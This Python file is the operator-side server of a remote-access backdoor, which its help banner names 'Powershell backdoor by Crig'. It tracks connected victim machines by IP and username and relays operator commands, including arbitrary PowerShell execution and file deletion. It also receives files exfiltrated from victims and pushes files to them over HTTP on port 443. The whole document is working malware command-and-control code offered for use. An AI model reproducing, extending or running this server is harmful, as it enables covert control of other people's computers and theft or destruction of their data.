import http.server
import socketserver
import json
import time
import string
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import ssl
import threading
from threading import Timer

import zipfile, os

last_id = 0
clients_conneted = []

current_client_id = None
last_input = None

output_gotten = True

max_waiting_time_for_message = 10
max_waiting_time_for_client = 60

def reset_output_gotten():
    output_gotten = True

class Client:
    def __init__(self, id, ip, username, last_req_time):
        self.id = id
        self.ip = ip
        self.username = username
        self.last_req_time = last_req_time


class WebServer(http.server.SimpleHTTPRequestHandler):
    # def do_GET(self):
    #     self.send_response(404)
    #     self.send_header('Content-type', 'application/json')
    #     self.end_headers()
    #     self.wfile.write(json.dumps({"error": "you can't send GET request"}).encode())

    def do_POST(self):
        global last_id, clients_conneted, last_input, current_client_id, output_gotten

        if self.path == '/generate':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            post_dict = json.loads(post_data)

            if 'username' in post_dict:
                client_id = last_id
                client_ip = self.client_address[0]
                client_username = post_dict['username']

                last_id += 1

                response = {
                    "id": client_id,
                }

                clients_conneted.append(Client(client_id, client_ip, client_username, time.time()))

                print(f"---New client! ID: {client_id}, IP: {client_ip}, Username: {client_username}---")

                try:
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps(response).encode())
                except:
                    print("Error while sending response")

        elif self.path == "/":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            post_dict = json.loads(post_data)
        
            if 'id' in post_dict and 'output' in post_dict:
                id = post_dict["id"]
                output = post_dict["output"]

                if(len([x for x in clients_conneted if x.id == id]) > 0):
                    client = [x for x in clients_conneted if x.id == id][0]
                    client_id = clients_conneted.index(client)
                    clients_conneted[client_id].last_req_time = time.time()
                    
                    if output != None:
                        if "value" in output: 
                            print(output["value"])
                        else: 
                            print(output)
                        output_gotten = True

                    response = {
                        "input": ""
                    }

                    if last_input != None:
                        response["input"] = last_input
                        last_input = None

                    try:
                        self.send_response(200)
                        self.send_header('Content-type', 'application/json')
                        self.end_headers()
                        self.wfile.write(json.dumps(response).encode())
                    except:
                        print("Error while sending response")

        elif self.path == "/download":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            post_dict = json.loads(post_data)


            if 'dir' in post_dict:
                print(f"Client Wants to download file: {post_dict['dir']}")
                
                source_path = post_dict['dir']
                print(source_path)
                # Create a temporary zip file
                temp_zipfile = "temp.zip"
                with zipfile.ZipFile(temp_zipfile, 'w', zipfile.ZIP_DEFLATED) as zf:
                    if os.path.isdir(source_path):
                        for foldername, subfolders, filenames in os.walk(source_path):
                            for filename in filenames:
                                file_path = os.path.join(foldername, filename)
                                arcname = os.path.relpath(file_path, source_path)
                                zf.write(file_path, arcname)
                    else:
                        zf.write(source_path, os.path.basename(source_path))

                # Send the zip file as the response
                with open(temp_zipfile, 'rb') as f:
                    zip_bytes = f.read()
                
                try:
                    # Set the response headers
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/octet-stream')
                    self.end_headers()

                    # Send the zip file bytes as the response
                    self.wfile.write(zip_bytes)
                except:
                    print("Error while sending response")
                # Remove the temporary zip file
                os.remove(temp_zipfile)




        elif self.path == "/upload":
            try:
                content_type, content_length = self.headers['Content-Type'], int(self.headers['Content-Length'])
                file_content = self.rfile.read(content_length)


                timestamp = int(time.time())
                filename = f"downloaded{timestamp}.zip"
                with open(filename, 'wb') as f:
                    f.write(file_content)


                response = "File downloaded successfully!"
                try:
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps(response).encode())
                except:
                    print("Error while sending response")

            except:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'File download failed!')
            
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not Found')

    def log_message(self, format, *args):
        return "h"

def input_handler():
    global last_id, clients_conneted, last_input, current_client_id, output_gotten

    while True:
        if output_gotten == True:

            output_gotten = False
            server_input = ""

            if current_client_id == None:
                server_input = input(f"Enter command for Server: ")
            else:
                client = [x for x in clients_conneted if x.id == current_client_id][0]
                server_input = input(f"Enter command for client(ID: {client.id}, {client.username}, {client.ip}): ")

            commands = " ".join(server_input.split()).split(" ")

            match commands[0]:
                case "":
                    output_gotten = True
                case "list":
                    print(f"Clients:")

                    for client in clients_conneted:
                        print(f"{client.id}: {client.username}, {client.ip}")

                    output_gotten = True

                case "connect":
                    if(len(commands) > 1):
                        id = int(commands[1])
                        if(len([x for x in clients_conneted if x.id == id]) > 0):
                            current_client_id = id
                            print(f"now connected to Client {id}")
                    else: print("Usage: connect <CientID>")
                    output_gotten = True

                case "disconnect":
                    current_client_id = None
                    print("disconnected from Client")
                    output_gotten = True

                case "help":
                    print("""
 ▄████▄   ██▀███   ██▓  ▄████ 
▒██▀ ▀█  ▓██ ▒ ██▒▓██▒ ██▒ ▀█▒
▒▓█    ▄ ▓██ ░▄█ ▒▒██▒▒██░▄▄▄░
▒▓▓▄ ▄██▒▒██▀▀█▄  ░██░░▓█  ██▓
▒ ▓███▀ ░░██▓ ▒██▒░██░░▒▓███▀▒
░ ░▒ ▒  ░░ ▒▓ ░▒▓░░▓   ░▒   ▒ 
  ░  ▒     ░▒ ░ ▒░ ▒ ░  ░   ░ 
░          ░░   ░  ▒ ░░ ░   ░ 
░ ░         ░      ░        ░
░                             
Powershell backdoor by Crig ♥
                          
list - list all clients
connect <id> - connect to client
disconnect - disconnect from current client
help - list all commands
                          
ls - list all files and dirs in current dir
pwd - print current dir
cd <dir> - change current dir
mkdir <dir name> - make new dir
rm <file> - remove file
cat <file> - print file insides
                          
run_ps <command> - run command in powershell
                          
upload_file <file on server> - uploads file or dir to server
get_file <file on client> - downloads file or dir from client
""")
                    output_gotten = True
                case _: 
                    if current_client_id == None:
                        output_gotten = True
                    else:
                        last_input = server_input
            
def client_handler():
    global last_id, clients_conneted, last_input, current_client_id, output_gotten

    while True:
        for client in clients_conneted:
            client_id = clients_conneted.index(client)
            if(client_id == current_client_id):
                if(output_gotten == False):
                    if(time.time() - client.last_req_time >= max_waiting_time_for_message):
                        print(f"Client (ID: {client.id}, IP: {client.ip}, username: {client.username}) isn't sending output")
                        output_gotten = True
            
            if(time.time() - client.last_req_time >= max_waiting_time_for_client):
                clients_conneted.remove(client)
                print(f"Client (ID: {client.id}, IP: {client.ip}, username: {client.username}) have disconnected")
                if(client_id == current_client_id):
                    current_client_id = None


if __name__ == "__main__":
    input_thread = threading.Thread(target=input_handler, args=())
    input_thread.start()

    client_thread = threading.Thread(target=client_handler, args=())
    client_thread.start()

    PORT = 443
    httpd = socketserver.TCPServer(('localhost', PORT), WebServer)
    
    print(f"Server started at http://localhost:{PORT}")
    httpd.serve_forever()
    

